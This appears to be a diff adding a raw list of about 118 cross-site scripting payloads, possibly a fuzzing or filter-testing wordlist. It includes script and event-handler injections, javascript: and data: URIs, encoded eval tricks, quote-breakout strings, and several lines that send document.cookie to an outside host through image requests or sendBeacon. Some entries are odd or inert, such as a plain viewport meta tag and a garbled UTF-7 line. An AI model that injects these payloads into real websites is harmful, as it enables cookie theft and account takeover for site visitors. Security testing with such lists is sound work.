@@ -1,0 +1,118 @@
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert(1)>
+<svg onload=alert('XSS')>
+<body onload=alert(1)>
+<body onload=alert('XSS')>
+javascript:alert(1)
+javascript:alert('XSS')
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+<script>console.log(1)</script>
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+<script>eval(alert(1))</script>
+<script>window['alert'](1)</script>
+<script>this['alert'](1)</script>
+<script>self['alert'](1)</script>
+<script>top['alert'](1)</script>
+<script>parent['alert'](1)</script>
+<script>frames['alert'](1)</script>
+<script>globalThis['alert'](1)</script>
+<script>var a=alert;a(1);</script>
+<script>setTimeout(alert, 0, 1)</script>
+<script>setInterval(alert, 0, 1)</script>
+<script>fetch('//example.com')</script>
+<script>new Image().src='//example.com/'+document.cookie</script>
+<script>navigator.sendBeacon('//example.com', document.cookie)</script>
+<script>document.location='//example.com'</script>
+<script>window.location='//example.com'</script>
+<script>location='//example.com'</script>
+<script>location.href='//example.com'</script>
+<script>location.replace('//example.com')</script>
+<script>location.assign('//example.com')</script>
+<script>window.open('//example.com')</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>document.write(unescape('%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E'))</script>
+<div style="background-image: url(javascript:alert(1))">
+<div style="background-image: url(data:image/svg+xml,%3Csvg%20onload%3Dalert%281%29%3E)">
+<iframe src="javascript:alert(1)"></iframe>
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+<object data="javascript:alert(1)"></object>
+<object data="data:text/html,<script>alert(1)</script>"></object>
+<embed src="javascript:alert(1)"></embed>
+<embed src="data:text/html,<script>alert(1)</script>"></embed>
+<a href="javascript:alert(1)">Click me</a>
+<a href="data:text/html,<script>alert(1)</script>">Click me</a>
+<form action="javascript:alert(1)"><button>Submit</button></form>
+<form action="data:text/html,<script>alert(1)</script>"><button>Submit</button></form>
+<input type="image" src="x" onerror="alert(1)">
+<input autofocus onfocus="alert(1)">
+<select autofocus onfocus="alert(1)">
+<textarea autofocus onfocus="alert(1)"></textarea>
+<keygen autofocus onfocus="alert(1)">
+<video src="x" onerror="alert(1)"></video>
+<audio src="x" onerror="alert(1)"></audio>
+<source src="x" onerror="alert(1)">
+<track src="x" onerror="alert(1)">
+<marquee onstart="alert(1)"></marquee>
+<details open ontoggle="alert(1)">
+<button onclick="alert(1)">Click me</button>
+<svg><script>alert(1)</script></svg>
+<svg><use href="data:image/svg+xml,<svg id='x'><script>alert(1)</script></svg>#x"></use></svg>
+<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)></style></mtext></svg></mglyph></table></mtext></math>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<iframe srcdoc="<img src=x onerror=alert(1)>"></iframe>
+<img src="x" onload="alert(1)" onerror="alert(1)">
+<img src="x" onmouseover="alert(1)" onmouseout="alert(1)">
+<img src="x" onmouseenter="alert(1)" onmouseleave="alert(1)">
+<img src="x" onclick="alert(1)" ondblclick="alert(1)">
+<img src="x" onfocus="alert(1)" onblur="alert(1)">
+<img src="x" onkeydown="alert(1)" onkeyup="alert(1)">
+<img src="x" onkeypress="alert(1)" oncontextmenu="alert(1)">
+<img src="x" ondrag="alert(1)" ondragend="alert(1)">
+<img src="x" ondragenter="alert(1)" ondragleave="alert(1)">
+<img src="x" ondragover="alert(1)" ondragstart="alert(1)">
+<img src="x" ondrop="alert(1)" onscroll="alert(1)">
+<img src="x" oncopy="alert(1)" oncut="alert(1)">
+<img src="x" onpaste="alert(1)" onabort="alert(1)">
+<img src="x" oncanplay="alert(1)" oncanplaythrough="alert(1)">
+<img src="x" onchange="alert(1)" oninput="alert(1)">
+<img src="x" oninvalid="alert(1)" onreset="alert(1)">
+<img src="x" onsearch="alert(1)" onselect="alert(1)">
+<img src="x" onsubmit="alert(1)" ontouchstart="alert(1)">
+<img src="x" ontouchend="alert(1)" ontouchmove="alert(1)">
+<img src="x" ontouchcancel="alert(1)" onwheel="alert(1)">
+<script>/*<!--*/alert(1)/*--*/</script>
+<!--<script>alert(1)</script>-->
+<![CDATA[<script>alert(1)</script>]]>
+<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(1)"></div>
+<style>@keyframes x{}</style><div style="animation-name:x" onanimationend="alert(1)"></div>
+<style>@keyframes x{}</style><div style="animation-name:x" onanimationiteration="alert(1)"></div>
+<style>@import 'javascript:alert(1)';</style>
+<style>body{background-image:url('javascript:alert(1)')}</style>
+<link rel="stylesheet" href="javascript:alert(1)">
+<link rel="prefetch" href="javascript:alert(1)">
+<link rel="prerender" href="javascript:alert(1)">
+<link rel="dns-prefetch" href="javascript:alert(1)">
+<link rel="preconnect" href="javascript:alert(1)">
+<link rel="preload" href="javascript:alert(1)" as="script">
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<meta http-equiv="set-cookie" content="a=1;url=javascript:alert(1)">
+<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'">
+<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&AH4&AAA
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<base href="javascript:alert(1)//">
+<param name="movie" value="javascript:alert(1)">
+<applet code="javascript:alert(1)">
+<isindex type="image" src="x" onerror="alert(1)">
+<isindex action="javascript:alert(1)" type="image">
+<xss>
+';alert(1);'
+";alert(1);"
+');alert(1);'
+");alert(1);"
+\');alert(1);//
+\";alert(1);//
